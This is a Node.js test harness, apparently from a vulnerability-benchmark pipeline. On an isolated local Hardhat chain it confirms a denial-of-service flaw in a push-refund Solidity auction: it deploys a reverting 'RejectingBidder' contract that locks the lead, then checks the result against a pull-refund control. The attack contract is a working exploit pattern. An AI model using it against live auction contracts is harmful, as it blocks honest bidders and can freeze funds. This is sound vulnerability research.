'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CONTROL_SOURCE = `pragma solidity ^0.4.15;
contract SecureAuction {
    address public currentFrontrunner;
    uint public currentBid;
    mapping(address => uint) public refunds;
    function bid() public payable {
        require(msg.value > currentBid);
        if (currentFrontrunner != address(0)) refunds[currentFrontrunner] += currentBid;
        currentFrontrunner = msg.sender;
        currentBid = msg.value;
    }
}`;
const BIDDER_SOURCE = `pragma solidity ^0.4.15;
contract AuctionBidTarget { function bid() public payable; }
contract RejectingBidder {
    function placeBid(address target) public payable {
        AuctionBidTarget(target).bid.value(msg.value)();
    }
    function() public payable { revert(); }
}`;

function digest(value) { return crypto.createHash('sha256').update(value).digest('hex'); }

function compile(sourceName, source) {
  const input = { language: 'Solidity', sources: {
    [sourceName]: { content: source }, 'SecureAuction.sol': { content: CONTROL_SOURCE },
    'RejectingBidder.sol': { content: BIDDER_SOURCE },
  }, settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, sourceName, contractName) {
  const item = contracts?.[sourceName]?.[contractName];
  if (!item?.abi || !item?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return item;
}

async function deploy(signer, item) {
  const contract = await new ContractFactory(item.abi, item.evm.bytecode.object, signer).deploy();
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('deployment_failed');
  await contract.waitForDeployment();
  return contract;
}

async function storageWord(provider, target, slot) {
  return BigInt(await provider.send('eth_getStorageAt', [target, `0x${slot.toString(16)}`, 'latest']));
}

function wordAddress(word) {
  return `0x${word.toString(16).padStart(64, '0').slice(-40)}`.toLowerCase();
}

async function expectRevert(contract, signer, value) {
  try {
    const receipt = await (await contract.connect(signer).getFunction('bid')({ value, gasLimit: 500000 })).wait();
    return { status: receipt.status, hash: receipt.hash };
  } catch (error) {
    const receipt = error.receipt || error.info?.receipt || null;
    return { status: Number(receipt?.status ?? 0), hash: receipt?.hash || error.transactionHash || null };
  }
}

(async () => {
  const sourcePath = path.resolve(process.argv[2] || '');
  const sourceBytes = fs.readFileSync(sourcePath);
  const sourceSha256 = digest(sourceBytes);
  const expectedSha256 = process.env.TRAINING_SOURCE_SHA256 || '';
  if (!/^[a-f0-9]{64}$/.test(expectedSha256) || sourceSha256 !== expectedSha256) {
    throw new Error('training_smartbugs_auction_source_hash_mismatch');
  }
  if (!String(process.env.BENCHMARK_SOLC_VERSION || '').startsWith('0.4.')) {
    throw new Error('training_smartbugs_auction_requires_pragma_compatible_solc');
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '').replace(/^0x/, '');
  if (!/^[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('training_auction_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('training_smartbugs_auction_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('training_smartbugs_auction_evm_not_isolated');
  }

  const sourceName = path.basename(sourcePath);
  const contracts = compile(sourceName, sourceBytes.toString('utf8'));
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('training_smartbugs_auction_chain_id_mismatch');
  const attacker = await provider.getSigner(0);
  const victim = await provider.getSigner(1);
  const vulnerable = await deploy(attacker, artifact(contracts, sourceName, 'DosAuction'));
  const secure = await deploy(attacker, artifact(contracts, 'SecureAuction.sol', 'SecureAuction'));
  const bidder = await deploy(attacker, artifact(contracts, 'RejectingBidder.sol', 'RejectingBidder'));
  const victimAddress = (await victim.getAddress()).toLowerCase();
  const vulnerableAddress = await vulnerable.getAddress();
  const secureAddress = await secure.getAddress();
  const bidderAddress = await bidder.getAddress();
  const attackPrice = 1000000000000000000n;
  const victimPrice = 2000000000000000000n;
  const transactions = [];

  const firstVulnerable = await (await bidder.getFunction('placeBid')(vulnerableAddress,
    { value: attackPrice, gasLimit: 500000 })).wait();
  transactions.push({ name: 'vulnerable_attacker_bid', status: firstVulnerable.status, hash: firstVulnerable.hash });
  const vulnerableBefore = {
    leader: wordAddress(await storageWord(provider, vulnerableAddress, 0n)),
    bid: await storageWord(provider, vulnerableAddress, 1n),
    balance: await provider.getBalance(vulnerableAddress),
  };
  const blocked = await expectRevert(vulnerable, victim, victimPrice);
  const vulnerableAfter = {
    leader: wordAddress(await storageWord(provider, vulnerableAddress, 0n)),
    bid: await storageWord(provider, vulnerableAddress, 1n),
    balance: await provider.getBalance(vulnerableAddress),
  };

  const firstSecure = await (await bidder.getFunction('placeBid')(secureAddress,
    { value: attackPrice, gasLimit: 500000 })).wait();
  transactions.push({ name: 'secure_attacker_bid', status: firstSecure.status, hash: firstSecure.hash });
  const secureVictim = await (await secure.connect(victim).getFunction('bid')(
    { value: victimPrice, gasLimit: 500000 })).wait();
  transactions.push({ name: 'secure_victim_bid', status: secureVictim.status, hash: secureVictim.hash });
  const secureAfter = {
    leader: (await secure.getFunction('currentFrontrunner')()).toLowerCase(),
    bid: BigInt(await secure.getFunction('currentBid')()),
    balance: await provider.getBalance(secureAddress),
    priorBidderRefund: BigInt(await secure.getFunction('refunds')(bidderAddress)),
  };

  const blockedVictim = blocked.status === 0
    && vulnerableBefore.leader === bidderAddress.toLowerCase()
    && vulnerableAfter.leader === vulnerableBefore.leader
    && vulnerableAfter.bid === attackPrice && vulnerableBefore.bid === attackPrice
    && vulnerableAfter.balance === attackPrice && vulnerableBefore.balance === attackPrice;
  const secureProgress = secureVictim.status === 1 && secureAfter.leader === victimAddress
    && secureAfter.bid === victimPrice && secureAfter.balance === attackPrice + victimPrice
    && secureAfter.priorBidderRefund === attackPrice;
  const confirmed = blockedVictim && secureProgress && transactions.every((item) => item.status === 1);
  const result = {
    schemaVersion: 1, sampleId: 'smartbugs-dos-auction', state: confirmed ? 'confirmed' : 'unconfirmed',
    confirmedVulnerability: confirmed, vulnerability: 'denial_of_service_push_refund',
    sourceSha256, compilerVersion: solc.version(), compilerArtifactSha256,
    proofScope: 'A rejecting leader blocks a victim higher bid in the exact collected push-refund source; a local pull-refund control accepts it and records the prior bid.',
    mode: 'isolated_in_process',
    vulnerableAuction: {
      leaderBefore: vulnerableBefore.leader, leaderAfter: vulnerableAfter.leader,
      bidBeforeWei: vulnerableBefore.bid.toString(), bidAfterWei: vulnerableAfter.bid.toString(),
      balanceBeforeWei: vulnerableBefore.balance.toString(), balanceAfterWei: vulnerableAfter.balance.toString(),
    },
    secureControl: { leaderAfter: secureAfter.leader, bidAfterWei: secureAfter.bid.toString(),
      balanceAfterWei: secureAfter.balance.toString(), priorBidderRefundWei: secureAfter.priorBidderRefund.toString() },
    blockedTransaction: blocked, transactions,
    assertions: [
      { name: 'rejecting_leader_blocks_higher_bid_and_preserves_victim_visible_state', passed: blockedVictim },
      { name: 'pull_refund_control_accepts_victim_bid_and_records_refund', passed: secureProgress },
    ],
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'source_bound_dos_or_pull_refund_control_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 2;
});
